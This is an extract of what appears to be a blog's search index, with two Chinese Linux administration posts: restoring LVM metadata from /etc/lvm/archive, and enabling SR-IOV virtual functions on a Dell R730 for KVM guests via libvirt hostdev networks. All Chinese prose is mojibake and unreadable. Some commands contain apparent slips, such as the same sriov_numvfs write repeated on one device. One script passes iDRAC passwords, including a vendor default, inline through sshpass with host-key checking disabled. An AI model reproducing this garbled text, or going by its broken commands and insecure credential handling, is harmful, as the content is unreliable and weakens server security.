\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e/etc/lvm/backup/VolGroupæ˜¯å½“å‰lvmé…ç½®çš„ä¸€ä¸ªå¤‡ä»½ï¼Œè€Œ/etc/lvm/archiveæ˜¯å½’æ¡£ã€‚\u003c/p\u003e\n\u003cp\u003eçœ‹çœ‹å½’æ¡£ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -l /etc/lvm/archive/*  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-rw-------. \u003cspan class=\"m\"\u003e1\u003c/span\u003e root root \u003cspan class=\"m\"\u003e1820\u003c/span\u003e Jun \u003cspan class=\"m\"\u003e12\u003c/span\u003e  \u003cspan class=\"m\"\u003e2015\u003c/span\u003e /etc/lvm/archive/VolGroup_00000-444365108.vg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ¢å¤æ–¹æ³•ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evgcfgrestore  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå…·ä½“æ¢å¤çš„æ­¥éª¤ï¼š é¦–å…ˆæŸ¥çœ‹blkidï¼Œçœ‹çœ‹ç¡¬ç›˜åˆ†åŒºçš„UUID\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eblkid  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/mapper/VolGroup-LogVol01: \u003cspan class=\"nv\"\u003eUUID\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;d6d24cc3-5e4a-4f4d-a0b1-2524e727b0fe\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ext4\u0026#34;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda1: \u003cspan class=\"nv\"\u003eUUID\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;3d0103ac-1b18-4da5-bc20-4b7a980a55c0\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ext4\u0026#34;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda2: \u003cspan class=\"nv\"\u003eUUID\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;i5Cd6V-IVHN-e694-o9CQ-OZJe-zvt0-AhUBLq\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;LVM2_member\u0026#34;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/mapper/VolGroup-LogVol00: \u003cspan class=\"nv\"\u003eUUID\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;06fe7af0-dee5-494a-9b5b-11bf95244acd\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;swap\u0026#34;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæŸ¥çœ‹lvmä¿¡æ¯ï¼Œæ‰¾å‡ºé‡Œé¢æ‰€æœ‰ç‰©ç†å·çš„UUIDï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eless /etc/lvm/archive/VolGroup_00000-444365108.vg  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        physical_volumes \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                pv0 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"nv\"\u003eid\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;i5Cd6V-IVHN-e694-o9CQ-OZJe-zvt0-AhUBLq\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"nv\"\u003edevice\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/dev/sda2\u0026#34;\u003c/span\u003e    \u003cspan class=\"c1\"\u003e# Hint only\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé¦–å…ˆæ¢å¤æ‰€æœ‰çš„pvï¼Œç‰©ç†å·ï¼Œè¿™é‡Œæˆ‘ä»¬å°±ä¸€ä¸ªç‰©ç†å·ï¼Œæ‰€ä»¥æ‰§è¡Œä¸€æ¬¡ï¼Œå¦‚æœæœ‰å¤šä¸ªç‰©ç†å·ï¼Œä¸€ä¸ªä¸€ä¸ªæ¥å³å¯\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epvcreate --uuid \u003cspan class=\"s2\"\u003e\u0026#34;i5Cd6V-IVHN-e694-o9CQ-OZJe-zvt0-AhUBLq\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  --restorefile /etc/lvm/archive/VolGroup_00000-444365108.vg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç‰©ç†å·æ¢å¤å®Œäº†ï¼Œå†æ¢å¤lvï¼Œé€»è¾‘å·ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evgcfgrestore -f /etc/lvm/archive/VolGroup_00000-444365108.vg VolGroup  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¼„å®ŒåvgdisplayæŸ¥çœ‹ä¸€ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evgdisplay  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  --- Volume group ---\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  VG Name               VolGroup\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  System ID             \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Format                lvm2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Metadata Areas        \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Metadata Sequence No  \u003cspan class=\"m\"\u003e9\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  VG Access             read/write\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  VG Status             resizable\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  MAX LV                \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Cur LV                \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Open LV               \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Max PV                \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Cur PV                \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Act PV                \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  VG Size               1.64 TiB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  PE Size               4.00 MiB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Total PE              \u003cspan class=\"m\"\u003e428705\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Alloc PE / Size       \u003cspan class=\"m\"\u003e428705\u003c/span\u003e / 1.64 TiB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Free  PE / Size       \u003cspan class=\"m\"\u003e0\u003c/span\u003e / \u003cspan class=\"m\"\u003e0\u003c/span\u003e   \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  VG UUID               3h3yik-kmqP-Q8sC-5bn0-cwtw-SXpo-orMlKn\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå°±æ¢å¤æˆåŠŸäº†ã€‚\u003c/p\u003e","title":"LVMå·å¿…é¡»å¤‡ä»½metadata"},{"content":"ä»€ä¹ˆæ˜¯SR-IOVå‘¢?\nç®€å•çš„è¯´ï¼ŒSR-IOVæ˜¯ä¸€ç§è™šæ‹ŸåŒ–æ–¹æ¡ˆï¼Œç”¨æ¥ä½¿ä¸€ä¸ªPCIeçš„ç‰©ç†è®¾å¤‡ï¼Œèƒ½è™šæ‹Ÿå‡ºå¤šä¸ªè®¾å¤‡ï¼Œè¿™äº›è™šæ‹Ÿå‡ºæ¥çš„è®¾å¤‡çœ‹èµ·æ¥å°±åƒæ˜¯å¤šä¸ªçœŸå®çš„ç‰©ç†è®¾å¤‡ä¸€æ ·ï¼Œå¹¶è·å¾—èƒ½å¤Ÿä¸æœ¬æœºæ€§èƒ½åª²ç¾çš„ I/O æ€§èƒ½ã€‚\nSR-IOVç°åœ¨æœ€å¤šæ˜¯ç”¨åœ¨ç½‘å¡ä¸Šï¼Œkvmè™šæ‹Ÿæœºçš„ç½‘å¡åŠŸèƒ½ä¸€èˆ¬ä¼šä¸‹é™åˆ°å®ä½“æœºçš„30-50%ï¼Œå¦‚æœæ”¹ç”¨SR-IOVä¼šå¤§å¤§æé«˜ç½‘å¡æ€§èƒ½ã€‚\nSR-IOV æœ‰2ç§åŠŸèƒ½ï¼š\nç‰©ç†åŠŸèƒ½ (Physical Function, PF) å°±æ˜¯æ ‡å‡†çš„PCIeçš„åŠŸèƒ½äº† è™šæ‹ŸåŠŸèƒ½ (Virtual Function, VF) ä¸ç‰©ç†åŠŸèƒ½å…³è”çš„ä¸€ç§åŠŸèƒ½ã€‚VF æ˜¯ä¸€ç§è½»é‡çº§ PCIe åŠŸèƒ½ï¼Œå¯ä»¥ä¸ç‰©ç†åŠŸèƒ½ä»¥åŠä¸åŒä¸€ç‰©ç†åŠŸèƒ½å…³è”çš„å…¶ä»– VF å…±äº«ä¸€ä¸ªæˆ–å¤šä¸ªç‰©ç†èµ„æºã€‚VF ä»…å…è®¸æ‹¥æœ‰ç”¨äºå…¶è‡ªèº«è¡Œä¸ºçš„é…ç½®èµ„æºã€‚ å¥½çš„ï¼Œå¦‚ä½•åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨å®ƒå‘¢ï¼Ÿ\nåœºæ™¯å¦‚ä¸‹ï¼š å¦‚ä¸Šï¼š æœºæˆ¿é‡Œæœ‰ä¸¤å°äº¤æ¢æœº:\nswitch-1ç”¨æ¥è¿æ¥å„æœºå™¨çš„eth0å£ switch-2ç”¨æ¥è¿æ¥å„æœºå™¨çš„eth1å£ switch-1å’Œswitch-2äº’è” è¿™æ˜¯ä¸€ç§æœºæˆ¿çš„æ ‡å‡†è¿æ³•ï¼Œeth0å’Œeth1åšbondingï¼Œåšçº¿è·¯å†—ä½™ server-2æ˜¯ä¸€å°Dell R730çš„æœåŠ¡å™¨ï¼Œeth0è¿switch-1ï¼Œeth1è¿switch-2ï¼Œä¸Šé¢è·‘äº†ä¸‰ä¸ªè™šæœºï¼š\nVM-1è·‘åœ¨åŸºäºbondingçš„Bridgeä¸Šï¼Œæ ‡å‡†çš„åšæ³• VM-2å’ŒVM-2åˆ™æ˜¯åˆ©ç”¨äº†SR-IOVï¼Œä»è™šæ‹Ÿç½‘å¡ç›´è¿åˆ°ç‰©ç†ç½‘å¡ï¼Œå‡å°‘äº†ä¸­é—´ç¯èŠ‚ï¼Œæé«˜äº†ç½‘å¡çš„æ•ˆç‡ã€‚ é¦–å…ˆè¦æŠŠæœåŠ¡å™¨çš„vtå’Œsr-iovæ‰“å¼€ï¼š\nSystem BIOS \u0026gt; Processor Settings \u0026gt; Virtualization Technology\nSystem BIOS \u0026gt; Integrated Devices \u0026gt; SR-IOV Global Enable å½“ç„¶ï¼Œè¿™ä¹ˆéº»çƒ¦çš„äº‹æƒ…ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨è„šæœ¬é€šè¿‡idracè°ƒç”¨racadmæ¥åšå¥½äº†ï¼š\n#!/bin/sh sshpass -p \u0026#34;xxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm set BIOS.ProcSettings.ProcVirtualization Enabled sshpass -p \u0026#34;calvin\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm set BIOS.IntegratedDevices.SriovGlobalEnable Enabled sshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm serveraction powercycle æ³¨æ„ï¼ŒDell R730çš„æœºå™¨ç”¨å¾—æ˜¯Intel I350çš„ä»¥å¤ªç½‘å¡ï¼Œæ¯ä¸ªç½‘å£æœ€å¤šæ”¯æŒ8ä¸ªVFï¼Œå¦‚æœæ˜¯é«˜çº§çš„X520ç½‘å¡ï¼Œå°±æ”¯æŒ64ä¸ªVFã€‚\næŸ¥çœ‹ä¸€ä¸‹ç½‘å¡ï¼Œæœ‰ä»¥å¤ªç½‘å¡i350ä¹Ÿæœ‰å…‰å¡82599ESï¼š\nlspci | grep net 01:00.0 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 01:00.1 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 19:00.0 Ethernet controller: Intel Corporation 82599ES 10-Gigabit SFI/SFP+ Network Connection (rev 01) 19:00.1 Ethernet controller: Intel Corporation 82599ES 10-Gigabit SFI/SFP+ Network Connection (rev 01) 82599ES 10Gçš„å¡ï¼Œå†çœ‹æ”¯æŒå¤šå°‘\ncat /sys/class/net/em1/device/sriov_totalvfs 63 æ”¯æŒ64ä¸ªvfs\nCentos 6ç¼–è¾‘æ ¸å¿ƒé‡å¯ç³»ç»Ÿï¼š\nvi /boot/grub/grub.conf kernelååŠ ä¸ªå‚æ•°intel_iommu=on kernel /vmlinuz-2.6.32-504.el6.x86_64 ro root=UUID=16154774-dbaf-4fcb-aedb-0513cb65a0eb rd_NO_LUKS rd_NO_LVM LANG=en_US.UTF-8 rd_NO_MD SYSFONT=latarcyrheb-sun16 crashkernel=auto KEYBOARDTYPE=pc KEYTABLE=us rd_NO_DM rhgb quiet intel_iommu=on Centos 7ç¼–è¾‘æ ¸å¿ƒé‡å¯ç³»ç»Ÿï¼š\nkernelååŠ ä¸ªå‚æ•°ï¼Œåªè™šä¸¤ä¸ªç½‘å¡å°±å¥½ï¼Œintel_iommu=on ixgbe.max_vfs=2 vi /etc/default/grub GRUB_CMDLINE_LINUX=\u0026#34;crashkernel=auto rhgb quiet intel_iommu=on ixgbe.max_vfs=2\u0026#34; grub2-mkconfig -o /boot/grub2/grub.cfg å…ˆlspciçœ‹çœ‹è®¾å¤‡ï¼š\nlspci 01:00.0 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 01:00.1 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 01:00.2 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 01:00.3 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) lspci -v 01:00.0 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) Subsystem: Dell Gigabit 4P I350-t rNDC Flags: bus master, fast devsel, latency 0, IRQ 46 Memory at 91e00000 (32-bit, non-prefetchable) [size=1M] Memory at 91f0c000 (32-bit, non-prefetchable) [size=16K] Expansion ROM at 91f80000 [disabled] [size=512K] Capabilities: [40] Power Management version 3 Capabilities: [50] MSI: Enable- Count=1/1 Maskable+ 64bit+ Capabilities: [70] MSI-X: Enable+ Count=10 Masked- Capabilities: [a0] Express Endpoint, MSI 00 Capabilities: [e0] Vital Product Data Capabilities: [100] Advanced Error Reporting Capabilities: [140] Device Serial Number ec-f4-bb-ff-ff-d9-96-43 Capabilities: [150] Alternative Routing-ID Interpretation (ARI) Capabilities: [160] Single Root I/O Virtualization (SR-IOV) Capabilities: [1a0] Transaction Processing Hints Capabilities: [1c0] Latency Tolerance Reporting Capabilities: [1d0] Access Control Services Kernel driver in use: igb Kernel modules: igb æ³¨æ„ä¸Šé¢æœ‰ä¸€è¡Œè¡¨ç¤ºæ˜¯æ”¯æŒçš„ï¼š Capabilities: [160] Single Root I/O Virtualization (SR-IOV)\nç„¶åæˆ‘ä»¬å¿…é¡»æ¿€æ´»VFsï¼Œä¸Šé¢æˆ‘ä»¬lspciæŸ¥çœ‹å››ä¸ªI350ç½‘å¡çš„usb idï¼Œem1æ˜¯01:00.0ï¼Œem2æ˜¯01:00.1ï¼Œem3æ˜¯01:00.2ï¼Œem4æ˜¯01:00.4ï¼Œæ¿€æ´»em1å’Œem2çš„VFsï¼š\necho 7 \u0026gt; /sys/bus/pci/devices/0000\\:01\\:00.0/sriov_numvfs echo 7 \u0026gt; /sys/bus/pci/devices/0000\\:01\\:00.0/sriov_numvfs è§é¬¼äº†ï¼Œæœ€å¤§æ˜¯8ä¸ªï¼Œè¿™é‡Œæœ€å¤šåªèƒ½å»º7ä¸ªã€‚lspciçœ‹çœ‹ï¼Œä»ç¬¬5è¡Œèµ·ï¼Œå¤šäº†14ä¸ªè™šæ‹Ÿç½‘å¡ï¼ˆä¸€ä¸ªç½‘å¡7ä¸ªï¼‰ï¼š\nlspci|grep I350 01:00.0 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 01:00.1 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 01:00.2 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 01:00.3 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 01:10.0 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:10.1 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:10.4 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:10.5 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:11.0 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:11.1 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:11.4 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:11.5 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:12.0 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:12.1 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:12.4 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:12.5 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:13.0 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:13.1 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) è¿™æ—¶ç³»ç»Ÿä¸­ä¼šå¤šå‡º14ä¸ªç½‘å¡ï¼š\nip link show 12: eth0: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether ea:c0:8c:e1:e8:6d brd ff:ff:ff:ff:ff:ff 13: eth1: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether e6:7f:65:3a:94:cf brd ff:ff:ff:ff:ff:ff 14: eth2: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether a2:39:5e:a7:5c:17 brd ff:ff:ff:ff:ff:ff 15: eth3: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether 9a:dd:4a:14:87:48 brd ff:ff:ff:ff:ff:ff 16: eth4: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether 2a:07:15:af:44:1c brd ff:ff:ff:ff:ff:ff 17: eth5: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether 42:6c:7c:11:1f:40 brd ff:ff:ff:ff:ff:ff 18: eth6: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether 86:5f:69:12:48:56 brd ff:ff:ff:ff:ff:ff 19: eth7: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether 72:d7:d0:0a:6a:86 brd ff:ff:ff:ff:ff:ff 20: eth8: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether 22:4f:16:83:40:83 brd ff:ff:ff:ff:ff:ff 21: eth9: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether 1e:a1:10:50:82:cd brd ff:ff:ff:ff:ff:ff 22: eth10: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether de:d7:35:6f:8a:8b brd ff:ff:ff:ff:ff:ff 23: eth11: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether ce:ab:e1:81:0e:31 brd ff:ff:ff:ff:ff:ff 24: eth12: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether d6:35:8e:ed:d9:1d brd ff:ff:ff:ff:ff:ff 25: eth13: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether 52:c5:00:45:74:2c brd ff:ff:ff:ff:ff:ff å®šä¹‰ä¸¤ä¸ªç½‘ç»œæ± ï¼Œåªè¦æŒ‡å®šæŒ‡å®špfå³å¯ï¼Œvfä¼šåŠ¨æ€åˆ†é…ç»™è™šæœºï¼š\ncat net01.xml \u0026lt;network\u0026gt; \u0026lt;name\u0026gt;passthrough_em1\u0026lt;/name\u0026gt; \u0026lt;forward mode=\u0026#39;hostdev\u0026#39; managed=\u0026#39;yes\u0026#39;\u0026gt; \u0026lt;pf dev=\u0026#39;em1\u0026#39;/\u0026gt; \u0026lt;/forward\u0026gt;\u0026lt;/network\u0026gt; \u0026lt;/network\u0026gt; cat net02.xml \u0026lt;network\u0026gt; \u0026lt;name\u0026gt;passthrough_em2\u0026lt;/name\u0026gt; \u0026lt;forward mode=\u0026#39;hostdev\u0026#39; managed=\u0026#39;yes\u0026#39;\u0026gt; \u0026lt;pf dev=\u0026#39;em2\u0026#39;/\u0026gt; \u0026lt;/forward\u0026gt;\u0026lt;/network\u0026gt; \u0026lt;/network\u0026gt; å¯åŠ¨è¿™2ä¸ªç½‘ç»œï¼š\nvirsh net-define net01.xml virsh net-start passthrough_em1 virsh net-autostart passthrough_em1 virsh net-define net02.xml virsh net-start passthrough_em2 virsh net-autostart passthrough_em2 modprobe vfio æˆ‘ä»¬ç¼–è¾‘è™šæœºçš„xmlé…ç½®æ–‡ä»¶\n... \u0026lt;interface type=\u0026#34;network\u0026#34;\u0026gt; \u0026lt;source network=\u0026#34;passthrough_em1\u0026#34;/\u0026gt; \u0026lt;/interface\u0026gt; \u0026lt;interface type=\u0026#34;network\u0026#34;\u0026gt; \u0026lt;source network=\u0026#34;passthrough_em2\u0026#34;/\u0026gt; \u0026lt;/interface\u0026gt; ... okï¼Œ å¯åŠ¨è™šæœºå³å¯ã€‚\næ³¨æ„ï¼Œem1å’Œem2çš„bondingå‚æ•°ï¼Œåœ¨å®ä½“æœºå’Œè™šæœºä¸­çš„bondingé…ç½®æ˜¯ä¸€æ ·çš„ï¼š\nBONDING_OPTS=\u0026#34;miimon=80 mode=1 primary=eth0 updelay=30000\u0026#34; ä¸ºé¿å…é¢‘ç¹åˆ‡æ¢ï¼Œupdelayè®¾ç½®ä¸º30ç§’\nä¾‹å¤–ï¼š å®æœºå’Œè™šæœºçš„bondingæ˜¯ä¸€æ ·çš„ï¼Œå¦‚æœå®æœºç½‘å¡eth0åäº†ï¼Œeth1æ¥ç®¡ï¼Œé‚£ä¹ˆè™šæœºä¸­åŒæ ·ä¹Ÿä¼šé£˜åˆ°eth1ã€‚è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œå¦‚æœç½‘å¡å¤„äºbondingçŠ¶æ€ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„ç½‘å¡çš„macåœ°å€éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå¦‚æœeth0æŒ‚äº†ï¼Œé‚£ä¹ˆbongdingçš„é©±åŠ¨ç¨‹åºä¼šå»æ”¹å˜eth1çš„macåœ°å€ï¼ŒæŠŠè€çš„eth0çš„åœ°å€èµ‹ç»™eth1ï¼Œåœ¨å®ä½“æœºä¸Šï¼Œmacéƒ½ä¸€æ ·ï¼Œæ‰€ä»¥ä¼šæ‹’ç»ï¼Œä½†æ˜¯åœ¨è™šæœºä¸Šå´ä¼šæˆåŠŸï¼Œè¿™æ ·å°±å¯¼è‡´è™šæœºå’Œå®æœºåœ¨åŒä¸€ä¸ªç½‘å¡ä¸Šæœ‰ä¸¤ä¸ªä¸åŒçš„macåœ°å€ï¼Œå‘åˆ°è™šæœºä¸Šeth1çš„åŒ…ä¼šè¢«å½“æˆmac 